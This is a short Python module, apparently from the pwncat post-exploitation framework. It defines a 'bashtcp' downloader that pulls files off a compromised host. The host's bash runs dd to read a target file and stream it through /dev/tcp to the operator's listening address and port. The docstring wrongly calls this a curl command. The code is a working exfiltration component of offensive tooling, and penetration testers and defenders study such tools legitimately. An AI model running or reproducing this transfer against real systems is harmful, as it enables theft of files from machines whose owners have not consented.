#!/usr/bin/env python3
from typing import Generator
import shlex

from pwncat.downloader.base import RawDownloader, DownloadError


class BashTCPDownloader(RawDownloader):

    NAME = "bashtcp"
    BINARIES = ["bash", "dd"]

    def command(self) -> Generator[str, None, None]:
        """ Generate the curl command to post the file """

        lhost = self.pty.vars["lhost"]
        lport = self.server.server_address[1]
        remote_path = shlex.quote(self.remote_path)

        self.pty.run(f"""bash -c "dd if={remote_path} > /dev/tcp/{lhost}/{lport}" """,)
